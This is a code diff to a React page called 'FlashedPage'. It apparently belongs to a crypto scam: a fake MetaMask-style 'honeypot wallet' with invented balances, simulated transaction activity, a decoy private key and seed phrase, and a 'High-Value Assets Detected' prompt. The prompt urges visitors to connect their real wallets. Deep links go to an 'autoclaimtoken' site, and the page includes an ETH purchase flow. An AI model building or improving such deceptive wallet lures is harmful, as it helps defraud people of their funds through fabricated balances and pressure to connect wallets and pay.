@@ -15,7 +15,42 @@ export default function FlashedPage() {
   const [transactions, setTransactions] = useState([]);
   const [accessLevel, setAccessLevel] = useState(1);
   const [timeLeft, setTimeLeft] = useState(24 * 60 * 60);
-  const [accounts, setAccounts] = useState([]);
+  
+  // Load persisted data from localStorage
+  const loadPersistedData = () => {
+    if (typeof window !== 'undefined') {
+      const savedActivities = localStorage.getItem('metamask_activities');
+      const savedAccounts = localStorage.getItem('metamask_accounts');
+      
+      return {
+        activities: savedActivities ? JSON.parse(savedActivities) : [],
+        accounts: savedAccounts ? JSON.parse(savedAccounts) : [
+          { id: 1, address: '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C', balance: 75842.33, isActive: true },
+          { id: 2, address: '0x8ba1f109551bD432803012645Hac189451b934c4', balance: 0, isActive: false },
+          { id: 3, address: '0x9cb2g210662cE543904123756Iad290562c045d5', balance: 8934.21, isActive: false },
+          { id: 4, address: '0xadc3h321773dF654a05234867Jbe391673d156e6', balance: 0, isActive: false },
+          { id: 5, address: '0xbed4i432884eG765b06345978Kcf492784e267f7', balance: 45123.67, isActive: false },
+          { id: 6, address: '0xcfe5j543995fH876c07456089Ldg593895f378g8', balance: 0, isActive: false },
+          { id: 7, address: '0xdgf6k654aa6gI987d08567190Meh694906g489h9', balance: 34567.45, isActive: false },
+          { id: 8, address: '0xehg7l765bb7hJ098e09678201Nfi795017h590i0', balance: 56789.23, isActive: false }
+        ]
+      };
+    }
+    return { activities: [], accounts: [] };
+  };
+
+  const persistedData = loadPersistedData();
+  const [activities, setActivities] = useState(persistedData.activities);
+  const [accounts, setAccounts] = useState(persistedData.accounts);
+  const [selectedAccount, setSelectedAccount] = useState(1);
+
+  // Persist data to localStorage
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      localStorage.setItem('metamask_activities', JSON.stringify(activities));
+      localStorage.setItem('metamask_accounts', JSON.stringify(accounts));
+    }
+  }, [activities, accounts]);
 
   useEffect(() => {
     generateHoneypotWallet();
@@ -25,41 +60,68 @@ export default function FlashedPage() {
       setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
     }, 1000);
     
-    // Simulate auto-withdrawals every 30 seconds
-    const autoWithdraw = setInterval(() => {
-      if (Math.random() > 0.7) { // 30% chance
-        const amounts = ['150.00', '275.50', '89.25', '420.00', '67.80'];
-        const tokens = ['USDT', 'USDC', 'ETH', 'LINK', 'UNI'];
-        const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
-        const randomToken = tokens[Math.floor(Math.random() * tokens.length)];
-        
-        setWalletData(prev => ({
-          ...prev,
-          recentActivity: [
-            { 
-              type: 'Auto-Withdraw', 
-              token: randomToken, 
-              amount: randomAmount, 
-              time: 'Just now', 
-              hash: '0x' + Math.random().toString(16).substr(2, 64) 
-            },
-            ...prev.recentActivity.slice(0, 9)
-          ]
-        }));
-      }
-    }, 30000);
-    
-    return () => {
-      clearInterval(timer);
-      clearInterval(autoWithdraw);
-    };
+    return () => clearInterval(timer);
   }, []);
-  
+
+  // Auto-generate activities with realistic images and proper balance deduction
   useEffect(() => {
-    if (walletData) {
-      generateAccounts();
-    }
-  }, [walletData, accessLevel]);
+    const generateActivity = () => {
+      const activityTypes = [
+        { 
+          type: 'Received', 
+          amount: Math.random() * 5 + 0.1, 
+          from: '0x' + Math.random().toString(16).substr(2, 40),
+          image: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
+          balanceChange: 'positive'
+        },
+        { 
+          type: 'Sent', 
+          amount: Math.random() * 2 + 0.05, 
+          to: '0x' + Math.random().toString(16).substr(2, 40),
+          image: 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
+          balanceChange: 'negative'
+        },
+        { 
+          type: 'Swap', 
+          amount: Math.random() * 3 + 0.2, 
+          token: ['USDC', 'DAI', 'WETH'][Math.floor(Math.random() * 3)],
+          image: 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
+          balanceChange: 'neutral'
+        },
+        { 
+          type: 'Withdraw', 
+          amount: Math.random() * 10 + 1, 
+          platform: ['Uniswap', 'Compound', 'Aave'][Math.floor(Math.random() * 3)],
+          image: 'https://cryptologos.cc/logos/compound-comp-logo.png',
+          balanceChange: 'negative'
+        }
+      ];
+      
+      const activity = activityTypes[Math.floor(Math.random() * activityTypes.length)];
+      const newActivity = {
+        id: Date.now(),
+        ...activity,
+        timestamp: new Date().toLocaleString(),
+        status: 'Confirmed'
+      };
+      
+      // Update balance based on activity type
+      if (activity.balanceChange === 'positive') {
+        setAccounts(prev => prev.map(acc => 
+          acc.id === selectedAccount ? { ...acc, balance: acc.balance + activity.amount } : acc
+        ));
+      } else if (activity.balanceChange === 'negative') {
+        setAccounts(prev => prev.map(acc => 
+          acc.id === selectedAccount ? { ...acc, balance: Math.max(0, acc.balance - activity.amount) } : acc
+        ));
+      }
+      
+      setActivities(prev => [newActivity, ...prev.slice(0, 9)]);
+    };
+
+    const interval = setInterval(generateActivity, 30000);
+    return () => clearInterval(interval);
+  }, [selectedAccount]);
   
   const formatTime = (seconds) => {
     const hours = Math.floor(seconds / 3600);
@@ -68,20 +130,27 @@ export default function FlashedPage() {
     return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
   };
 
-  const generateAccounts = () => {
-    if (!walletData) return;
+  const handleAccountSwitch = (accountId) => {
+    setSelectedAccount(accountId);
+    const account = accounts.find(acc => acc.id === accountId);
     
-    const fixedAccounts = [];
-    for (let i = 1; i <= 8; i++) {
-      const wallet = ethers.Wallet.createRandom();
-      fixedAccounts.push({
-        id: i,
-        address: i === 1 ? walletData.address : wallet.address,
-        balance: i === 1 ? walletData.totalValue : 0,
-        isActive: i === 1
-      });
+    // Update accounts state to reflect current balances
+    setAccounts(prev => prev.map(acc => ({
+      ...acc,
+      isActive: acc.id === accountId
+    })));
+    
+    // Update wallet data with selected account balance
+    if (walletData) {
+      setWalletData(prev => ({
+        ...prev,
+        totalValue: account.balance,
+        address: account.address
+      }));
     }
-    setAccounts(fixedAccounts);
+    
+    // Regenerate wallet data for new account
+    setTimeout(() => generateHoneypotWallet(), 100);
   };
 
   const checkWalletConnection = async () => {
@@ -115,124 +184,103 @@ export default function FlashedPage() {
   };
 
   const generateHoneypotWallet = () => {
-    const randomWallet = ethers.Wallet.createRandom();
+    const activeAccount = accounts.find(acc => acc.isActive) || accounts[0];
+    const accountBalance = activeAccount?.balance || 0;
     
-    // Generate realistic daily fluctuating amounts
-    const baseAmounts = {
-      USDT: 24891.47,
-      USDC: 12456.83, 
-      WETH: 17187.90,
-      LINK: 11862.06,
-      UNI: 9020.68
+    // Generate tokens that match account balance
+    const generateTokensForBalance = (totalBalance) => {
+      if (totalBalance === 0) return [];
+      
+      const tokenDistribution = {
+        USDT: 0.35,
+        USDC: 0.25,
+        WETH: 0.20,
+        LINK: 0.12,
+        UNI: 0.08
+      };
+      
+      return Object.entries(tokenDistribution).map(([symbol, percentage]) => {
+        const usdValue = totalBalance * percentage;
+        const contracts = {
+          USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+          USDC: '0xA0b86a33E6441E6C7D3E4081C3cC6E7C3c2b4C0d',
+          WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+          LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
+          UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'
+        };
+        
+        return {
+          symbol,
+          balance: symbol === 'WETH' ? (usdValue / 3000).toFixed(4) : usdValue.toFixed(2),
+          usdValue,
+          change: `${(Math.random() * 10 - 5).toFixed(1)}%`,
+          contract: contracts[symbol]
+        };
+      });
     };
-    
-    // Add daily variation (-5% to +5%)
-    const variation = () => (Math.random() - 0.5) * 0.1 + 1;
     
     const honeypotWallet = {
-      address: randomWallet.address,
-      privateKey: randomWallet.privateKey,
-      seedPhrase: randomWallet.mnemonic.phrase,
+      address: activeAccount?.address || '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C',
+      privateKey: ethers.Wallet.createRandom().privateKey,
+      seedPhrase: ethers.Wallet.createRandom().mnemonic.phrase,
       ethBalance: 0.000000001,
-      tokens: [
-        { 
-          symbol: 'USDT', 
-          balance: (24891.47 * variation()).toFixed(2), 
-          usdValue: baseAmounts.USDT * variation(), 
-          change: `${(Math.random() * 10 - 5).toFixed(1)}%`,
-          contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
-        },
-        { 
-          symbol: 'USDC', 
-          balance: (12456.83 * variation()).toFixed(2), 
-          usdValue: baseAmounts.USDC * variation(), 
-          change: `${(Math.random() * 6 - 3).toFixed(1)}%`,
-          contract: '0xA0b86a33E6441E6C7D3E4081C3cC6E7C3c2b4C0d'
-        },
-        { 
-          symbol: 'WETH', 
-          balance: (5.7293 * variation()).toFixed(4), 
-          usdValue: baseAmounts.WETH * variation(), 
-          change: `${(Math.random() * 8 - 4).toFixed(1)}%`,
-          contract: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
-        },
-        { 
-          symbol: 'LINK', 
-          balance: (847.29 * variation()).toFixed(2), 
-          usdValue: baseAmounts.LINK * variation(), 
-          change: `${(Math.random() * 12 - 6).toFixed(1)}%`,
-          contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA'
-        },
-        { 
-          symbol: 'UNI', 
-          balance: (1293.84 * variation()).toFixed(2), 
-          usdValue: baseAmounts.UNI * variation(), 
-          change: `${(Math.random() * 15 - 7).toFixed(1)}%`,
-          contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'
-        }
-      ],
-      nfts: [
-        { name: 'Bored Ape #7234', collection: 'BAYC', value: '$45,000', image: 'https://via.placeholder.com/100' },
-        { name: 'CryptoPunk #3421', collection: 'CryptoPunks', value: '$28,000', image: 'https://via.placeholder.com/100' },
-        { name: 'Azuki #892', collection: 'Azuki', value: '$12,000', image: 'https://via.placeholder.com/100' }
-      ],
-      defiPositions: [
-        { protocol: 'Uniswap V3', type: 'Liquidity Pool', value: '$8,450', apy: '12.4%' },
-        { protocol: 'Aave', type: 'Lending', value: '$15,200', apy: '3.8%' },
-        { protocol: 'Compound', type: 'Staking', value: '$6,750', apy: '5.2%' }
-      ],
-      recentActivity: [
-        { type: 'Received', token: 'USDT', amount: '2,450.00', time: '2 hours ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
-        { type: 'Swapped', token: 'ETH → USDC', amount: '1.5 ETH', time: '1 day ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
-        { type: 'Sent', token: 'LINK', amount: '125.00', time: '3 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
-        { type: 'Received', token: 'UNI', amount: '89.50', time: '5 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
-        { type: 'Auto-Withdraw', token: 'USDT', amount: '500.00', time: 'Just now', hash: '0x' + Math.random().toString(16).substr(2, 64) }
-      ]
+      totalValue: accountBalance,
+      tokens: generateTokensForBalance(accountBalance),
+      nfts: accountBalance > 10000 ? [
+        { name: 'Bored Ape #7234', collection: 'BAYC', value: '$45,000', image: 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=100&h=100&fit=crop' },
+        { name: 'CryptoPunk #3421', collection: 'CryptoPunks', value: '$28,000', image: 'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?w=100&h=100&fit=crop' }
+      ] : [],
+      defiPositions: accountBalance > 5000 ? [
+        { protocol: 'Uniswap V3', type: 'Liquidity Pool', value: `$${Math.round(accountBalance * 0.1).toLocaleString()}`, apy: '12.4%' },
+        { protocol: 'Aave', type: 'Lending', value: `$${Math.round(accountBalance * 0.15).toLocaleString()}`, apy: '3.8%' }
+      ] : [],
+      recentActivity: activities
     };
-    
-    // Progressive disclosure based on access level
-    const fullValue = honeypotWallet.tokens.reduce((sum, token) => sum + token.usdValue, 0);
-    
-    if (accessLevel === 1) {
-      honeypotWallet.totalValue = fullValue * 0.3;
-      honeypotWallet.tokens = honeypotWallet.tokens.slice(0, 2);
-    } else if (accessLevel === 2) {
-      honeypotWallet.totalValue = fullValue * 0.6;
-      honeypotWallet.tokens = honeypotWallet.tokens.slice(0, 4);
-    } else {
-      honeypotWallet.totalValue = fullValue;
-    }
     
     setWalletData(honeypotWallet);
   };
 
-  const connectWallet = async () => {
+  const detectAvailableWallets = () => {
+    const wallets = [];
+    
+    if (typeof window !== 'undefined' && window.ethereum) {
+      if (window.ethereum.isMetaMask) wallets.push('MetaMask');
+      if (window.ethereum.isTrust) wallets.push('Trust Wallet');
+      if (window.ethereum.isOKExWallet) wallets.push('OKX Wallet');
+      if (window.ethereum.isCoinbaseWallet) wallets.push('Coinbase Wallet');
+      if (window.ethereum.isBraveWallet) wallets.push('Brave Wallet');
+      
+      if (wallets.length === 0) wallets.push('Web3 Wallet');
+    }
+    
+    return wallets;
+  };
+
+  const connectWallet = async (walletType = null) => {
     try {
       if (window.ethereum) {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         setUserAddress(accounts[0]);
         localStorage.setItem('connectedWallet', accounts[0]);
         setShowModal(null);
+        return true;
       } else {
         setShowModal('walletOptions');
+        return false;
       }
     } catch (error) {
-      console.log('Connection failed');
+      console.log('Connection failed:', error);
+      return false;
     }
   };
 
   const detectWalletAndRedirect = () => {
-    const userAgent = navigator.userAgent.toLowerCase();
-    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/.test(userAgent);
+    const availableWallets = detectAvailableWallets();
     
-    if (isMobile) {
-      setShowModal('walletOptions');
+    if (availableWallets.length > 0) {
+      connectWallet();
     } else {
-      if (window.ethereum) {
-        connectWallet();
-      } else {
-        setShowModal('walletOptions');
-      }
+      setShowModal('walletOptions');
     }
   };
 
@@ -403,6 +451,8 @@ export default function FlashedPage() {
     </div>;
   }
 
+  const currentAccount = accounts.find(acc => acc.id === selectedAccount) || accounts[0];
+
   return (
     <>
       <Head>
@@ -431,11 +481,11 @@ export default function FlashedPage() {
             <div className="flex items-center justify-between mb-4">
               <div className="flex items-center cursor-pointer hover:bg-gray-700 p-2 rounded-lg transition-all" onClick={() => setShowModal('accountDetails')}>
                 <div className="w-8 h-8 mr-3">
-                  <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${userAddress}`} alt="Profile" className="w-full h-full rounded-full" />
+                  <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${currentAccount.address}`} alt="Profile" className="w-full h-full rounded-full" />
                 </div>
                 <div>
                   <div className="text-white font-semibold flex items-center">
-                    Account 1 
+                    Account {selectedAccount} 
                     <i className="fas fa-chevron-down text-gray-400 ml-2 text-xs"></i>
                   </div>
                   <div className="text-gray-400 text-sm">8 network addresses</div>
@@ -443,7 +493,7 @@ export default function FlashedPage() {
               </div>
               <div className="relative">
                 <div className="w-8 h-8 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center">
-                  <span className="text-white text-xs font-bold">1</span>
+                  <span className="text-white text-xs font-bold">{selectedAccount}</span>
                 </div>
                 <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full border border-gray-800"></div>
               </div>
@@ -452,10 +502,10 @@ export default function FlashedPage() {
             {/* Balance */}
             <div className="text-center mb-6">
               <div className="text-4xl font-bold text-white mb-2">
-                ${Math.round(walletData.totalValue).toLocaleString()}
+                ${Math.round(currentAccount.balance).toLocaleString()}
               </div>
               <div className="text-green-400 text-sm">
-                +${Math.round(walletData.totalValue).toLocaleString()} (+100.00%) Discover
+                +${Math.round(currentAccount.balance).toLocaleString()} (+100.00%) Discover
               </div>
             </div>
 
@@ -541,7 +591,7 @@ export default function FlashedPage() {
             </div>
           </div>
 
-          {/* Token List */}
+          {/* Content */}
           <div className="flex-1">
             {activeTab === 'Tokens' && (
               <div>
@@ -603,6 +653,13 @@ export default function FlashedPage() {
                     </div>
                   );
                 })}
+                
+                {walletData.tokens.length === 0 && (
+                  <div className="p-8 text-center">
+                    <div className="text-gray-400 text-sm">No tokens found</div>
+                    <div className="text-gray-500 text-xs mt-1">This account is empty</div>
+                  </div>
+                )}
               </div>
             )}
 
@@ -630,21 +687,23 @@ export default function FlashedPage() {
                     </div>
                   );
                 })}
+                
+                {walletData.defiPositions.length === 0 && (
+                  <div className="p-8 text-center">
+                    <div className="text-gray-400 text-sm">No DeFi positions</div>
+                    <div className="text-gray-500 text-xs mt-1">Start earning with DeFi protocols</div>
+                  </div>
+                )}
               </div>
             )}
 
             {activeTab === 'NFTs' && (
               <div>
                 {walletData.nfts.map((nft, index) => {
-                  const nftImages = {
-                    'Bored Ape #7234': 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=100&h=100&fit=crop',
-                    'CryptoPunk #3421': 'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?w=100&h=100&fit=crop',
-                    'Azuki #892': 'https://images.unsplash.com/photo-1634973357973-f2ed2657db3c?w=100&h=100&fit=crop'
-                  };
                   return (
                     <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                       <div className="flex items-center">
-                        <img src={nftImages[nft.name]} alt={nft.name} className="w-12 h-12 rounded-lg mr-3 object-cover" />
+                        <img src={nft.image} alt={nft.name} className="w-12 h-12 rounded-lg mr-3 object-cover" />
                         <div>
                           <div className="text-white font-medium">{nft.name}</div>
                           <div className="text-gray-400 text-sm">{nft.collection}</div>
@@ -657,49 +716,49 @@ export default function FlashedPage() {
                     </div>
                   );
                 })}
+                
+                {walletData.nfts.length === 0 && (
+                  <div className="p-8 text-center">
+                    <div className="text-gray-400 text-sm">No NFTs found</div>
+                    <div className="text-gray-500 text-xs mt-1">Discover and collect NFTs</div>
+                  </div>
+                )}
               </div>
             )}
 
             {activeTab === 'Activity' && (
               <div>
-                {walletData.recentActivity.map((activity, index) => {
-                  const getIcon = (type) => {
-                    switch(type) {
-                      case 'Received': return '↓';
-                      case 'Sent': return '↑';
-                      case 'Swapped': return '⇄';
-                      case 'Auto-Withdraw': return '⚡';
-                      default: return '•';
-                    }
-                  };
-                  const getColor = (type) => {
-                    switch(type) {
-                      case 'Received': return 'bg-green-500';
-                      case 'Sent': return 'bg-red-500';
-                      case 'Swapped': return 'bg-blue-500';
-                      case 'Auto-Withdraw': return 'bg-yellow-500';
-                      default: return 'bg-gray-500';
-                    }
-                  };
-                  
-                  return (
-                    <div key={index} className="flex items-center justify-between p-4 border-b border-gray-700">
-                      <div className="flex items-center">
-                        <div className={`w-8 h-8 ${getColor(activity.type)} rounded-full flex items-center justify-center mr-3`}>
-                          <span className="text-white text-xs">{getIcon(activity.type)}</span>
-                        </div>
-                        <div>
-                          <div className="text-white font-medium">{activity.type} {activity.token}</div>
-                          <div className="text-gray-400 text-sm">{activity.time}</div>
-                        </div>
-                      </div>
-                      <div className="text-right">
-                        <div className="text-white font-medium">{activity.amount}</div>
-                        <div className="text-green-400 text-sm">Confirmed</div>
-                      </div>
+                {activities.map((activity, index) => (
+                  <div key={activity.id || index} className="flex items-center space-x-3 p-3 hover:bg-gray-700 rounded-lg cursor-pointer">
+                    <div className="w-8 h-8 rounded-full flex items-center justify-center overflow-hidden">
+                      <img 
+                        src={activity.image || 'https://assets.coingecko.com/coins/images/279/small/ethereum.png'} 
+                        alt={activity.type}
+                        className="w-full h-full object-cover"
+                        onError={(e) => {
+                          e.target.src = 'https://assets.coingecko.com/coins/images/279/small/ethereum.png';
+                        }}
+                      />
                     </div>
-                  );
-                })}
+                    <div className="flex-1">
+                      <div className="text-white font-medium">{activity.type}</div>
+                      <div className="text-gray-400 text-sm">{activity.timestamp}</div>
+                      {activity.from && <div className="text-gray-500 text-xs">From: {activity.from.slice(0, 10)}...</div>}
+                      {activity.to && <div className="text-gray-500 text-xs">To: {activity.to.slice(0, 10)}...</div>}
+                      {activity.token && <div className="text-gray-500 text-xs">Token: {activity.token}</div>}
+                      {activity.platform && <div className="text-gray-500 text-xs">Platform: {activity.platform}</div>}
+                    </div>
+                    <div className="text-right">
+                      <div className={`font-medium ${
+                        activity.balanceChange === 'positive' ? 'text-green-400' : 
+                        activity.balanceChange === 'negative' ? 'text-red-400' : 'text-white'
+                      }`}>
+                        {activity.balanceChange === 'positive' ? '+' : activity.balanceChange === 'negative' ? '-' : ''}${activity.amount.toFixed(2)}
+                      </div>
+                      <div className="text-green-400 text-sm">{activity.status}</div>
+                    </div>
+                  </div>
+                ))}
                 
                 {transactions.map((tx) => (
                   <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
@@ -722,7 +781,226 @@ export default function FlashedPage() {
             )}
           </div>
 
-          {/* All Modals */}
+          {/* Account Details Modal */}
+          {showModal === 'accountDetails' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Select Account</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-3">
+                  {accounts.map(account => (
+                    <div 
+                      key={account.id} 
+                      onClick={() => {
+                        handleAccountSwitch(account.id);
+                        setShowModal(null);
+                      }}
+                      className="flex items-center justify-between p-3 hover:bg-gray-700 rounded-lg cursor-pointer transition-all"
+                    >
+                      <div className="flex items-center">
+                        <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${account.address}`} alt={`Account ${account.id}`} className="w-8 h-8 rounded-full mr-3" />
+                        <div>
+                          <div className="text-white font-medium flex items-center">
+                            Account {account.id}
+                            {account.isActive && <div className="w-2 h-2 bg-green-400 rounded-full ml-2"></div>}
+                          </div>
+                          <div className="text-gray-400 text-sm">{account.address.slice(0,10)}...{account.address.slice(-4)}</div>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <div className="text-white text-sm">${Math.round(account.balance).toLocaleString()}</div>
+                        <div className="text-gray-400 text-xs">{account.isActive ? 'Active' : account.balance > 0 ? 'Available' : 'Empty'}</div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Connect Wallet Prompt */}
+          {!userAddress && !showModal && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4">
+                <h3 className="text-white font-bold text-lg mb-4">High-Value Assets Detected</h3>
+                <p className="text-gray-300 mb-6">Connect your wallet to access ${Math.round(currentAccount.balance).toLocaleString()} in discovered tokens</p>
+                
+                {detectAvailableWallets().length > 0 ? (
+                  <>
+                    <button 
+                      onClick={() => connectWallet()}
+                      className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3 flex items-center justify-center"
+                    >
+                      <img 
+                        src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
+                        alt="Wallet" 
+                        className="w-5 h-5 mr-2"
+                      />
+                      Connect {detectAvailableWallets()[0]}
+                    </button>
+                    <button 
+                      onClick={() => setShowModal('walletOptions')}
+                      className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                    >
+                      Choose Different Wallet
+                    </button>
+                  </>
+                ) : (
+                  <>
+                    <button 
+                      onClick={() => setShowModal('walletOptions')}
+                      className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3"
+                    >
+                      Connect Wallet
+                    </button>
+                    <div className="text-gray-400 text-xs text-center">
+                      No wallet detected. Choose from available options.
+                    </div>
+                  </>
+                )}
+              </div>
+            </div>
+          )}
+
+          {/* Wallet Options Modal */}
+          {showModal === 'walletOptions' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                
+                {/* Detected Wallets */}
+                {detectAvailableWallets().length > 0 && (
+                  <div className="mb-4">
+                    <div className="text-gray-300 text-sm mb-2">Detected Wallets:</div>
+                    {detectAvailableWallets().map((wallet, index) => (
+                      <button 
+                        key={index}
+                        onClick={() => connectWallet(wallet)}
+                        className="flex items-center w-full bg-green-600 hover:bg-green-700 p-3 rounded-lg text-white font-semibold mb-2"
+                      >
+                        <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
+                          <span className="text-white font-bold">✓</span>
+                        </div>
+                        <div>
+                          <div>{wallet}</div>
+                          <div className="text-xs text-green-200">Ready to connect</div>
+                        </div>
+                      </button>
+                    ))}
+                    <div className="border-t border-gray-600 my-4"></div>
+                    <div className="text-gray-300 text-sm mb-2">Other Options:</div>
+                  </div>
+                )}
+                
+                <div className="space-y-3">
+                  <button 
+                    onClick={() => {
+                      if (window.ethereum && window.ethereum.isMetaMask) {
+                        connectWallet('MetaMask');
+                      } else {
+                        window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
+                      }
+                    }}
+                    className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <img 
+                      src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
+                      alt="MetaMask" 
+                      className="w-8 h-8 mr-3"
+                    />
+                    <div>
+                      <div>MetaMask</div>
+                      <div className="text-xs text-orange-200">Most popular wallet</div>
+                    </div>
+                  </button>
+                  <button 
+                    onClick={() => {
+                      if (window.ethereum && window.ethereum.isTrust) {
+                        connectWallet('Trust Wallet');
+                      } else {
+                        window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
+                      }
+                    }}
+                    className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <img 
+                      src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
+                      alt="Trust Wallet" 
+                      className="w-8 h-8 mr-3 rounded-lg"
+                    />
+                    <div>
+                      <div>Trust Wallet</div>
+                      <div className="text-xs text-blue-200">Mobile-first wallet</div>
+                    </div>
+                  </button>
+                  <button 
+                    onClick={() => {
+                      if (window.ethereum && window.ethereum.isOKExWallet) {
+                        connectWallet('OKX Wallet');
+                      } else {
+                        window.open('https://www.okx.com/web3', '_blank');
+                      }
+                    }}
+                    className="flex items-center w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">O</span>
+                    </div>
+                    <div>
+                      <div>OKX Wallet</div>
+                      <div className="text-xs text-green-200">Exchange wallet</div>
+                    </div>
+                  </button>
+                  <button 
+                    onClick={() => {
+                      if (window.ethereum && window.ethereum.isCoinbaseWallet) {
+                        connectWallet('Coinbase Wallet');
+                      } else {
+                        window.open('https://www.coinbase.com/wallet', '_blank');
+                      }
+                    }}
+                    className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-indigo-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">C</span>
+                    </div>
+                    <div>
+                      <div>Coinbase Wallet</div>
+                      <div className="text-xs text-indigo-200">Beginner friendly</div>
+                    </div>
+                  </button>
+                  <button 
+                    onClick={() => {
+                      const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                      setUserAddress(mockAddress);
+                      setShowModal(null);
+                      localStorage.setItem('connectedWallet', mockAddress);
+                    }}
+                    className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">+</span>
+                    </div>
+                    <div>
+                      <div>Other Wallet</div>
+                      <div className="text-xs text-gray-300">Manual connection</div>
+                    </div>
+                  </button>
+                </div>
+                <div className="mt-4 text-center">
+                  <p className="text-gray-400 text-sm">Choose your preferred wallet or download one above</p>
+                  <p className="text-gray-500 text-xs mt-1">All wallets work with this platform</p>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Buy Modal */}
           {showModal === 'buy' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
@@ -750,43 +1028,7 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {showModal === 'buyConfirm' && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
-                <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Purchase ETH</h3>
-                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
-                </div>
-                <div className="space-y-4">
-                  <div className="text-gray-300 text-sm mb-4">
-                    Select amount to purchase:
-                  </div>
-                  <button 
-                    onClick={() => processBuyETH('0.01')}
-                    disabled={loading}
-                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
-                  >
-                    Buy 0.01 ETH (~$30)
-                  </button>
-                  <button 
-                    onClick={() => processBuyETH('0.05')}
-                    disabled={loading}
-                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
-                  >
-                    Buy 0.05 ETH (~$150)
-                  </button>
-                  <button 
-                    onClick={() => processBuyETH('0.1')}
-                    disabled={loading}
-                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
-                  >
